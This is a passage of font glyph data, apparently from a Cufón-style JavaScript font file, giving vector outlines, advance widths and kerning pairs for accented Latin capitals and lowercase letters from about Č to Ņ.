97v-86,0,-59,-117,-59,-195v0,-40,20,-63,59,-63v48,-1,63,35,59,88r-37,0v1,-24,2,-52,-21,-52v-13,0,-20,7,-20,25r0,136v0,18,7,25,20,25v26,0,21,-36,21,-61xm52,-301r37,0r0,37r-37,0r0,-37","w":138,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":4,"X":4,".":2,",":2,"Y":4,"\u00dd":4,"\u0176":4,"\u0178":4,"\u1ef2":4,"y":4,"\u00fd":4,"\u00ff":4,"\u0177":4,"\u1ef3":4}},"\u010c":{"d":"92,-94r37,0v4,55,-7,97,-59,97v-86,0,-59,-117,-59,-195v0,-40,20,-63,59,-63v48,-1,63,35,59,88r-37,0v1,-24,2,-52,-21,-52v-13,0,-20,7,-20,25r0,136v0,18,7,25,20,25v26,0,21,-36,21,-61xm18,-306r35,0r17,21r17,-21r35,0r-33,42r-38,0","w":138,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":4,"X":4,".":2,",":2,"Y":4,"\u00dd":4,"\u0176":4,"\u0178":4,"\u1ef2":4,"y":4,"\u00fd":4,"\u00ff":4,"\u0177":4,"\u1ef3":4}},"\u010d":{"d":"92,-94r37,0v4,55,-7,97,-59,97v-86,0,-59,-117,-59,-195v0,-40,20,-63,59,-63v48,-1,63,35,59,88r-37,0v1,-24,2,-52,-21,-52v-13,0,-20,7,-20,25r0,136v0,18,7,25,20,25v26,0,21,-36,21,-61xm18,-306r35,0r17,21r17,-21r35,0r-33,42r-38,0","w":138,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":4,"X":4,".":2,",":2,"Y":4,"\u00dd":4,"\u0176":4,"\u0178":4,"\u1ef2":4,"y":4,"\u00fd":4,"\u00ff":4,"\u0177":4,"\u1ef3":4}},"\u010e":{"d":"14,0r0,-252v64,-2,127,-5,122,62v-6,77,28,194,-59,190r-63,0xm96,-192v1,-28,-18,-24,-42,-24r0,180v23,0,42,4,42,-24r0,-132xm18,-306r35,0r17,21r17,-21r35,0r-33,42r-38,0","w":146,"k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u010f":{"d":"14,0r0,-252v64,-2,127,-5,122,62v-6,77,28,194,-59,190r-63,0xm96,-192v1,-28,-18,-24,-42,-24r0,180v23,0,42,4,42,-24r0,-132xm18,-306r35,0r17,21r17,-21r35,0r-33,42r-38,0","w":146,"k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0110":{"d":"14,0r0,-110r-13,0r0,-32r13,0r0,-110v64,-2,127,-5,122,62v-6,77,28,194,-59,190r-63,0xm96,-192v1,-28,-18,-24,-42,-24r0,74r24,0r0,32r-24,0r0,74v23,0,42,4,42,-24r0,-132","w":146,"k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0111":{"d":"14,0r0,-110r-13,0r0,-32r13,0r0,-110v64,-2,127,-5,122,62v-6,77,28,194,-59,190r-63,0xm96,-192v1,-28,-18,-24,-42,-24r0,74r24,0r0,32r-24,0r0,74v23,0,42,4,42,-24r0,-132","w":146,"k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0112":{"d":"54,-216r0,70r54,0r0,36r-54,0r0,74r68,0r0,36r-108,0r0,-252r108,0r0,36r-68,0xm24,-296r87,0r0,30r-87,0r0,-30","w":132},"\u0113":{"d":"54,-216r0,70r54,0r0,36r-54,0r0,74r68,0r0,36r-108,0r0,-252r108,0r0,36r-68,0xm24,-296r87,0r0,30r-87,0r0,-30","w":132},"\u0114":{"d":"54,-216r0,70r54,0r0,36r-54,0r0,74r68,0r0,36r-108,0r0,-252r108,0r0,36r-68,0xm85,-306r25,0v0,27,-15,43,-43,43v-28,0,-42,-16,-42,-43r25,0v1,14,7,17,17,17v11,0,17,-3,18,-17","w":132},"\u0115":{"d":"54,-216r0,70r54,0r0,36r-54,0r0,74r68,0r0,36r-108,0r0,-252r108,0r0,36r-68,0xm85,-306r25,0v0,27,-15,43,-43,43v-28,0,-42,-16,-42,-43r25,0v1,14,7,17,17,17v11,0,17,-3,18,-17","w":132},"\u0116":{"d":"54,-216r0,70r54,0r0,36r-54,0r0,74r68,0r0,36r-108,0r0,-252r108,0r0,36r-68,0xm49,-301r37,0r0,37r-37,0r0,-37","w":132},"\u0117":{"d":"54,-216r0,70r54,0r0,36r-54,0r0,74r68,0r0,36r-108,0r0,-252r108,0r0,36r-68,0xm49,-301r37,0r0,37r-37,0r0,-37","w":132},"\u0118":{"d":"54,-216r0,70r54,0r0,36r-54,0r0,74r68,0r0,36r-17,0v-12,10,-11,26,4,27v7,0,9,-1,13,-2r0,20v-20,8,-57,5,-55,-18v0,-8,3,-19,18,-27r-71,0r0,-252r108,0r0,36r-68,0","w":132},"\u0119":{"d":"54,-216r0,70r54,0r0,36r-54,0r0,74r68,0r0,36r-17,0v-12,10,-11,26,4,27v7,0,9,-1,13,-2r0,20v-20,8,-57,5,-55,-18v0,-8,3,-19,18,-27r-71,0r0,-252r108,0r0,36r-68,0","w":132},"\u011a":{"d":"54,-216r0,70r54,0r0,36r-54,0r0,74r68,0r0,36r-108,0r0,-252r108,0r0,36r-68,0xm15,-306r36,0r16,21r17,-21r36,0r-34,42r-37,0","w":132},"\u011b":{"d":"54,-216r0,70r54,0r0,36r-54,0r0,74r68,0r0,36r-108,0r0,-252r108,0r0,36r-68,0xm15,-306r36,0r16,21r17,-21r36,0r-34,42r-37,0","w":132},"\u011c":{"d":"74,-104r0,-36r55,0v0,67,12,143,-59,143v-86,0,-59,-117,-59,-195v0,-40,20,-63,59,-63v48,-1,63,35,59,88r-37,0v1,-24,2,-52,-21,-52v-13,0,-20,7,-20,25r0,136v0,18,7,25,20,25v29,0,20,-44,21,-71r-18,0xm53,-264r-35,0r33,-42r38,0r33,42r-35,0r-17,-21","w":140,"k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u011d":{"d":"74,-104r0,-36r55,0v0,67,12,143,-59,143v-86,0,-59,-117,-59,-195v0,-40,20,-63,59,-63v48,-1,63,35,59,88r-37,0v1,-24,2,-52,-21,-52v-13,0,-20,7,-20,25r0,136v0,18,7,25,20,25v29,0,20,-44,21,-71r-18,0xm53,-264r-35,0r33,-42r38,0r33,42r-35,0r-17,-21","w":140,"k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u011e":{"d":"74,-104r0,-36r55,0v0,67,12,143,-59,143v-86,0,-59,-117,-59,-195v0,-40,20,-63,59,-63v48,-1,63,35,59,88r-37,0v1,-24,2,-52,-21,-52v-13,0,-20,7,-20,25r0,136v0,18,7,25,20,25v29,0,20,-44,21,-71r-18,0xm87,-306r25,0v0,27,-15,43,-43,43v-28,0,-42,-16,-42,-43r25,0v1,14,7,17,17,17v11,0,17,-3,18,-17","w":140,"k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u011f":{"d":"74,-104r0,-36r55,0v0,67,12,143,-59,143v-86,0,-59,-117,-59,-195v0,-40,20,-63,59,-63v48,-1,63,35,59,88r-37,0v1,-24,2,-52,-21,-52v-13,0,-20,7,-20,25r0,136v0,18,7,25,20,25v29,0,20,-44,21,-71r-18,0xm87,-306r25,0v0,27,-15,43,-43,43v-28,0,-42,-16,-42,-43r25,0v1,14,7,17,17,17v11,0,17,-3,18,-17","w":140,"k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0120":{"d":"74,-104r0,-36r55,0v0,67,12,143,-59,143v-86,0,-59,-117,-59,-195v0,-40,20,-63,59,-63v48,-1,63,35,59,88r-37,0v1,-24,2,-52,-21,-52v-13,0,-20,7,-20,25r0,136v0,18,7,25,20,25v29,0,20,-44,21,-71r-18,0xm51,-301r37,0r0,37r-37,0r0,-37","w":140,"k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0121":{"d":"74,-104r0,-36r55,0v0,67,12,143,-59,143v-86,0,-59,-117,-59,-195v0,-40,20,-63,59,-63v48,-1,63,35,59,88r-37,0v1,-24,2,-52,-21,-52v-13,0,-20,7,-20,25r0,136v0,18,7,25,20,25v29,0,20,-44,21,-71r-18,0xm51,-301r37,0r0,37r-37,0r0,-37","w":140,"k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0122":{"d":"74,-104r0,-36r55,0v0,67,12,143,-59,143v-86,0,-59,-117,-59,-195v0,-40,20,-63,59,-63v48,-1,63,35,59,88r-37,0v1,-24,2,-52,-21,-52v-13,0,-20,7,-20,25r0,136v0,18,7,25,20,25v29,0,20,-44,21,-71r-18,0xm66,49r-14,0r0,-37r37,0r0,33v-10,10,-10,30,-33,26","w":140,"k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0123":{"d":"74,-104r0,-36r55,0v0,67,12,143,-59,143v-86,0,-59,-117,-59,-195v0,-40,20,-63,59,-63v48,-1,63,35,59,88r-37,0v1,-24,2,-52,-21,-52v-13,0,-20,7,-20,25r0,136v0,18,7,25,20,25v29,0,20,-44,21,-71r-18,0xm66,49r-14,0r0,-37r37,0r0,33v-10,10,-10,30,-33,26","w":140,"k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0124":{"d":"54,-108r0,108r-40,0r0,-252r40,0r0,108r45,0r0,-108r40,0r0,252r-40,0r0,-108r-45,0xm60,-264r-36,0r34,-42r38,0r33,42r-35,0r-17,-21","w":153},"\u0125":{"d":"54,-108r0,108r-40,0r0,-252r40,0r0,108r45,0r0,-108r40,0r0,252r-40,0r0,-108r-45,0xm60,-264r-36,0r34,-42r38,0r33,42r-35,0r-17,-21","w":153},"\u0126":{"d":"56,-108r0,108r-40,0r0,-181r-12,0r0,-29r12,0r0,-42r40,0r0,42r45,0r0,-42r40,0r0,42r13,0r0,29r-13,0r0,181r-40,0r0,-108r-45,0xm56,-144r45,0r0,-37r-45,0r0,37","w":157},"\u0127":{"d":"56,-108r0,108r-40,0r0,-181r-12,0r0,-29r12,0r0,-42r40,0r0,42r45,0r0,-42r40,0r0,42r13,0r0,29r-13,0r0,181r-40,0r0,-108r-45,0xm56,-144r45,0r0,-37r-45,0r0,37","w":157},"\u0128":{"d":"14,0r0,-252r40,0r0,252r-40,0xm68,-305r20,15v-17,39,-44,23,-71,16v-7,0,-11,3,-16,12r-20,-15v17,-39,44,-23,71,-16v7,0,11,-3,16,-12","w":68},"\u0129":{"d":"14,0r0,-252r40,0r0,252r-40,0xm68,-305r20,15v-17,39,-44,23,-71,16v-7,0,-11,3,-16,12r-20,-15v17,-39,44,-23,71,-16v7,0,11,-3,16,-12","w":68},"\u012a":{"d":"14,0r0,-252r40,0r0,252r-40,0xm-9,-296r87,0r0,30r-87,0r0,-30","w":68},"\u012b":{"d":"14,0r0,-252r40,0r0,252r-40,0xm-9,-296r87,0r0,30r-87,0r0,-30","w":68},"\u012c":{"d":"14,0r0,-252r40,0r0,252r-40,0xm52,-306r25,0v0,27,-15,43,-43,43v-28,0,-42,-16,-42,-43r25,0v1,14,7,17,17,17v11,0,17,-3,18,-17","w":68},"\u012d":{"d":"14,0r0,-252r40,0r0,252r-40,0xm52,-306r25,0v0,27,-15,43,-43,43v-28,0,-42,-16,-42,-43r25,0v1,14,7,17,17,17v11,0,17,-3,18,-17","w":68},"\u012e":{"d":"14,0r0,-252r40,0r0,252v-21,-2,-25,27,-5,27v7,0,9,-1,13,-2r0,20v-20,8,-58,6,-56,-18v0,-8,4,-19,15,-27r-7,0","w":68},"\u012f":{"d":"14,0r0,-252r40,0r0,252v-21,-2,-25,27,-5,27v7,0,9,-1,13,-2r0,20v-20,8,-58,6,-56,-18v0,-8,4,-19,15,-27r-7,0","w":68},"\u0130":{"d":"14,0r0,-252r40,0r0,252r-40,0xm16,-301r37,0r0,37r-37,0r0,-37","w":68},"\u0131":{"d":"14,0r0,-252r40,0r0,252r-40,0","w":68},"\u0132":{"d":"14,0r0,-252r40,0r0,252r-40,0xm72,0r0,-36v21,0,36,1,36,-24r0,-192r40,0r0,189v-2,58,-32,68,-76,63","w":160},"\u0133":{"d":"14,0r0,-252r40,0r0,252r-40,0xm72,0r0,-36v21,0,36,1,36,-24r0,-192r40,0r0,189v-2,58,-32,68,-76,63","w":160},"\u0134":{"d":"4,0r0,-36v21,1,36,1,36,-24r0,-192r40,0r0,189v-2,58,-32,68,-76,63xm36,-264r-35,0r33,-42r38,0r33,42r-35,0r-17,-21","w":92,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0135":{"d":"4,0r0,-36v21,1,36,1,36,-24r0,-192r40,0r0,189v-2,58,-32,68,-76,63xm36,-264r-35,0r33,-42r38,0r33,42r-35,0r-17,-21","w":92,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0136":{"d":"105,0r-39,-100v-18,20,-11,64,-12,100r-40,0r0,-252r40,0r0,110r53,-110r38,0r-55,112r55,140r-40,0xm73,49r-14,0r0,-37r37,0r0,33v-10,10,-10,30,-33,26","w":149,"k":{"\u0153":3,"\u0152":3,"q":3,"Q":3,"C":3,"\u00c7":3,"\u0106":3,"\u0108":3,"\u010a":3,"\u010c":3,"G":3,"\u011c":3,"\u011e":3,"\u0120":3,"\u0122":3,"O":3,"\u00d2":3,"\u00d3":3,"\u00d4":3,"\u00d5":3,"\u00d6":3,"\u00d8":3,"\u014c":3,"\u014e":3,"\u0150":3,"\u01fe":3,"c":3,"\u00e7":3,"\u0107":3,"\u0109":3,"\u010b":3,"\u010d":3,"g":3,"\u011d":3,"\u011f":3,"\u0121":3,"\u0123":3,"o":3,"\u00f2":3,"\u00f3":3,"\u00f4":3,"\u00f5":3,"\u00f6":3,"\u00f8":3,"\u014d":3,"\u014f":3,"\u0151":3,"\u01ff":3,"S":2,"\u015a":2,"\u015c":2,"\u015e":2,"\u0160":2,"\u0218":2,"\u1e60":2,"U":1,"\u00d9":1,"\u00da":1,"\u00db":1,"\u00dc":1,"\u0168":1,"\u016a":1,"\u016c":1,"\u016e":1,"\u0170":1,"\u0172":1,"s":2,"\u00df":2,"\u015b":2,"\u015d":2,"\u015f":2,"\u0161":2,"\u0219":2,"\u1e61":2,"u":1,"\u00f9":1,"\u00fa":1,"\u00fb":1,"\u00fc":1,"\u0169":1,"\u016b":1,"\u016d":1,"\u016f":1,"\u0171":1,"\u0173":1}},"\u0137":{"d":"105,0r-39,-100v-18,20,-11,64,-12,100r-40,0r0,-252r40,0r0,110r53,-110r38,0r-55,112r55,140r-40,0xm73,49r-14,0r0,-37r37,0r0,33v-10,10,-10,30,-33,26","w":149,"k":{"\u0153":3,"\u0152":3,"q":3,"Q":3,"C":3,"\u00c7":3,"\u0106":3,"\u0108":3,"\u010a":3,"\u010c":3,"G":3,"\u011c":3,"\u011e":3,"\u0120":3,"\u0122":3,"O":3,"\u00d2":3,"\u00d3":3,"\u00d4":3,"\u00d5":3,"\u00d6":3,"\u00d8":3,"\u014c":3,"\u014e":3,"\u0150":3,"\u01fe":3,"c":3,"\u00e7":3,"\u0107":3,"\u0109":3,"\u010b":3,"\u010d":3,"g":3,"\u011d":3,"\u011f":3,"\u0121":3,"\u0123":3,"o":3,"\u00f2":3,"\u00f3":3,"\u00f4":3,"\u00f5":3,"\u00f6":3,"\u00f8":3,"\u014d":3,"\u014f":3,"\u0151":3,"\u01ff":3,"S":2,"\u015a":2,"\u015c":2,"\u015e":2,"\u0160":2,"\u0218":2,"\u1e60":2,"U":1,"\u00d9":1,"\u00da":1,"\u00db":1,"\u00dc":1,"\u0168":1,"\u016a":1,"\u016c":1,"\u016e":1,"\u0170":1,"\u0172":1,"s":2,"\u00df":2,"\u015b":2,"\u015d":2,"\u015f":2,"\u0161":2,"\u0219":2,"\u1e61":2,"u":1,"\u00f9":1,"\u00fa":1,"\u00fb":1,"\u00fc":1,"\u0169":1,"\u016b":1,"\u016d":1,"\u016f":1,"\u0171":1,"\u0173":1}},"\u0138":{"d":"105,0r-39,-100v-18,20,-11,64,-12,100r-40,0r0,-252r40,0r0,110r53,-110r38,0r-55,112r55,140r-40,0","w":149,"k":{"\u0153":3,"\u0152":3,"q":3,"Q":3,"C":3,"\u00c7":3,"\u0106":3,"\u0108":3,"\u010a":3,"\u010c":3,"G":3,"\u011c":3,"\u011e":3,"\u0120":3,"\u0122":3,"O":3,"\u00d2":3,"\u00d3":3,"\u00d4":3,"\u00d5":3,"\u00d6":3,"\u00d8":3,"\u014c":3,"\u014e":3,"\u0150":3,"\u01fe":3,"c":3,"\u00e7":3,"\u0107":3,"\u0109":3,"\u010b":3,"\u010d":3,"g":3,"\u011d":3,"\u011f":3,"\u0121":3,"\u0123":3,"o":3,"\u00f2":3,"\u00f3":3,"\u00f4":3,"\u00f5":3,"\u00f6":3,"\u00f8":3,"\u014d":3,"\u014f":3,"\u0151":3,"\u01ff":3,"S":2,"\u015a":2,"\u015c":2,"\u015e":2,"\u0160":2,"\u0218":2,"\u1e60":2,"U":1,"\u00d9":1,"\u00da":1,"\u00db":1,"\u00dc":1,"\u0168":1,"\u016a":1,"\u016c":1,"\u016e":1,"\u0170":1,"\u0172":1,"s":2,"\u00df":2,"\u015b":2,"\u015d":2,"\u015f":2,"\u0161":2,"\u0219":2,"\u1e61":2,"u":1,"\u00f9":1,"\u00fa":1,"\u00fb":1,"\u00fc":1,"\u0169":1,"\u016b":1,"\u016d":1,"\u016f":1,"\u0171":1,"\u0173":1}},"\u0139":{"d":"14,0r0,-252r40,0r0,216r65,0r0,36r-105,0xm54,-306r41,0r-39,42r-28,0","w":122,"k":{"\u201d":27,"\u201c":27,"\u2019":27,"\u2018":27,"}":-3,"v":12,"]":-3,"V":12,"?":11,")":-3,"T":18,"\u0162":18,"\u0164":18,"\u0166":18,"\u021a":18,"\u1e6a":18,"W":6,"\u0174":6,"\u1e80":6,"\u1e82":6,"\u1e84":6,"Y":22,"\u00dd":22,"\u0176":22,"\u0178":22,"\u1ef2":22,"-":14,"\u00ad":14,"t":18,"\u0163":18,"\u0165":18,"\u0167":18,"\u021b":18,"\u1e6b":18,"w":6,"\u0175":6,"\u1e81":6,"\u1e83":6,"\u1e85":6,"y":22,"\u00fd":22,"\u00ff":22,"\u0177":22,"\u1ef3":22,"J":-2,"\u0132":-2,"\u0134":-2,"j":-2,"\u0133":-2,"\u0135":-2,"\u0237":-2}},"\u013a":{"d":"14,0r0,-252r40,0r0,216r65,0r0,36r-105,0xm54,-306r41,0r-39,42r-28,0","w":122,"k":{"\u201d":27,"\u201c":27,"\u2019":27,"\u2018":27,"}":-3,"v":12,"]":-3,"V":12,"?":11,")":-3,"T":18,"\u0162":18,"\u0164":18,"\u0166":18,"\u021a":18,"\u1e6a":18,"W":6,"\u0174":6,"\u1e80":6,"\u1e82":6,"\u1e84":6,"Y":22,"\u00dd":22,"\u0176":22,"\u0178":22,"\u1ef2":22,"-":14,"\u00ad":14,"t":18,"\u0163":18,"\u0165":18,"\u0167":18,"\u021b":18,"\u1e6b":18,"w":6,"\u0175":6,"\u1e81":6,"\u1e83":6,"\u1e85":6,"y":22,"\u00fd":22,"\u00ff":22,"\u0177":22,"\u1ef3":22,"J":-2,"\u0132":-2,"\u0134":-2,"j":-2,"\u0133":-2,"\u0135":-2,"\u0237":-2}},"\u013b":{"d":"14,0r0,-252r40,0r0,216r65,0r0,36r-105,0xm63,49r-14,0r0,-37r36,0r0,33v-10,10,-9,30,-32,26","w":122,"k":{"\u201d":27,"\u201c":27,"\u2019":27,"\u2018":27,"}":-3,"v":12,"]":-3,"V":12,"?":11,")":-3,"T":18,"\u0162":18,"\u0164":18,"\u0166":18,"\u021a":18,"\u1e6a":18,"W":6,"\u0174":6,"\u1e80":6,"\u1e82":6,"\u1e84":6,"Y":22,"\u00dd":22,"\u0176":22,"\u0178":22,"\u1ef2":22,"-":14,"\u00ad":14,"t":18,"\u0163":18,"\u0165":18,"\u0167":18,"\u021b":18,"\u1e6b":18,"w":6,"\u0175":6,"\u1e81":6,"\u1e83":6,"\u1e85":6,"y":22,"\u00fd":22,"\u00ff":22,"\u0177":22,"\u1ef3":22,"J":-2,"\u0132":-2,"\u0134":-2,"j":-2,"\u0133":-2,"\u0135":-2,"\u0237":-2}},"\u013c":{"d":"14,0r0,-252r40,0r0,216r65,0r0,36r-105,0xm63,49r-14,0r0,-37r36,0r0,33v-10,10,-9,30,-32,26","w":122,"k":{"\u201d":27,"\u201c":27,"\u2019":27,"\u2018":27,"}":-3,"v":12,"]":-3,"V":12,"?":11,")":-3,"T":18,"\u0162":18,"\u0164":18,"\u0166":18,"\u021a":18,"\u1e6a":18,"W":6,"\u0174":6,"\u1e80":6,"\u1e82":6,"\u1e84":6,"Y":22,"\u00dd":22,"\u0176":22,"\u0178":22,"\u1ef2":22,"-":14,"\u00ad":14,"t":18,"\u0163":18,"\u0165":18,"\u0167":18,"\u021b":18,"\u1e6b":18,"w":6,"\u0175":6,"\u1e81":6,"\u1e83":6,"\u1e85":6,"y":22,"\u00fd":22,"\u00ff":22,"\u0177":22,"\u1ef3":22,"J":-2,"\u0132":-2,"\u0134":-2,"j":-2,"\u0133":-2,"\u0135":-2,"\u0237":-2}},"\u013d":{"d":"14,0r0,-252r40,0r0,216r65,0r0,36r-105,0xm91,-214r-15,0r0,-38r38,0v3,34,-8,53,-17,74r-16,0","w":122},"\u013e":{"d":"14,0r0,-252r40,0r0,216r65,0r0,36r-105,0xm91,-214r-15,0r0,-38r38,0v3,34,-8,53,-17,74r-16,0","w":122},"\u013f":{"d":"14,0r0,-252r40,0r0,216r65,0r0,36r-105,0xm76,-145r38,0r0,38r-38,0r0,-38","w":122,"k":{"\u201d":27,"\u201c":27,"\u2019":27,"\u2018":27,"}":-3,"v":12,"]":-3,"V":12,"?":11,")":-3,"T":18,"\u0162":18,"\u0164":18,"\u0166":18,"\u021a":18,"\u1e6a":18,"W":6,"\u0174":6,"\u1e80":6,"\u1e82":6,"\u1e84":6,"Y":22,"\u00dd":22,"\u0176":22,"\u0178":22,"\u1ef2":22,"-":14,"\u00ad":14,"t":18,"\u0163":18,"\u0165":18,"\u0167":18,"\u021b":18,"\u1e6b":18,"w":6,"\u0175":6,"\u1e81":6,"\u1e83":6,"\u1e85":6,"y":22,"\u00fd":22,"\u00ff":22,"\u0177":22,"\u1ef3":22,"J":-2,"\u0132":-2,"\u0134":-2,"j":-2,"\u0133":-2,"\u0135":-2,"\u0237":-2}},"\u0140":{"d":"14,0r0,-252r40,0r0,216r65,0r0,36r-105,0xm76,-145r38,0r0,38r-38,0r0,-38","w":122,"k":{"\u201d":27,"\u201c":27,"\u2019":27,"\u2018":27,"}":-3,"v":12,"]":-3,"V":12,"?":11,")":-3,"T":18,"\u0162":18,"\u0164":18,"\u0166":18,"\u021a":18,"\u1e6a":18,"W":6,"\u0174":6,"\u1e80":6,"\u1e82":6,"\u1e84":6,"Y":22,"\u00dd":22,"\u0176":22,"\u0178":22,"\u1ef2":22,"-":14,"\u00ad":14,"t":18,"\u0163":18,"\u0165":18,"\u0167":18,"\u021b":18,"\u1e6b":18,"w":6,"\u0175":6,"\u1e81":6,"\u1e83":6,"\u1e85":6,"y":22,"\u00fd":22,"\u00ff":22,"\u0177":22,"\u1ef3":22,"J":-2,"\u0132":-2,"\u0134":-2,"j":-2,"\u0133":-2,"\u0135":-2,"\u0237":-2}},"\u0141":{"d":"0,-34r0,-36r18,-19r0,-163r39,0r0,121r44,-47r0,36r-44,47r0,59r65,0r0,36r-104,0r0,-53","w":126,"k":{"\u201d":27,"\u201c":27,"\u2019":27,"\u2018":27,"}":-3,"v":12,"]":-3,"V":12,"?":11,")":-3,"T":18,"\u0162":18,"\u0164":18,"\u0166":18,"\u021a":18,"\u1e6a":18,"W":6,"\u0174":6,"\u1e80":6,"\u1e82":6,"\u1e84":6,"Y":22,"\u00dd":22,"\u0176":22,"\u0178":22,"\u1ef2":22,"-":14,"\u00ad":14,"t":18,"\u0163":18,"\u0165":18,"\u0167":18,"\u021b":18,"\u1e6b":18,"w":6,"\u0175":6,"\u1e81":6,"\u1e83":6,"\u1e85":6,"y":22,"\u00fd":22,"\u00ff":22,"\u0177":22,"\u1ef3":22,"J":-2,"\u0132":-2,"\u0134":-2,"j":-2,"\u0133":-2,"\u0135":-2,"\u0237":-2}},"\u0142":{"d":"0,-34r0,-36r18,-19r0,-163r39,0r0,121r44,-47r0,36r-44,47r0,59r65,0r0,36r-104,0r0,-53","w":126,"k":{"\u201d":27,"\u201c":27,"\u2019":27,"\u2018":27,"}":-3,"v":12,"]":-3,"V":12,"?":11,")":-3,"T":18,"\u0162":18,"\u0164":18,"\u0166":18,"\u021a":18,"\u1e6a":18,"W":6,"\u0174":6,"\u1e80":6,"\u1e82":6,"\u1e84":6,"Y":22,"\u00dd":22,"\u0176":22,"\u0178":22,"\u1ef2":22,"-":14,"\u00ad":14,"t":18,"\u0163":18,"\u0165":18,"\u0167":18,"\u021b":18,"\u1e6b":18,"w":6,"\u0175":6,"\u1e81":6,"\u1e83":6,"\u1e85":6,"y":22,"\u00fd":22,"\u00ff":22,"\u0177":22,"\u1ef3":22,"J":-2,"\u0132":-2,"\u0134":-2,"j":-2,"\u0133":-2,"\u0135":-2,"\u0237":-2}},"\u0143":{"d":"99,0r-49,-183r0,183r-36,0r0,-252r50,0r40,151r0,-151r36,0r0,252r-41,0xm84,-306r41,0r-39,42r-28,0","w":153},"\u0144":{"d":"99,0r-49,-183r0,183r-36,0r0,-252r50,0r40,151r0,-151r36,0r0,252r-41,0xm84,-306r41,0r-39,42r-28,0","w":153},"\u0145":{"d":"99,0r-49,-183r0,183r-36,0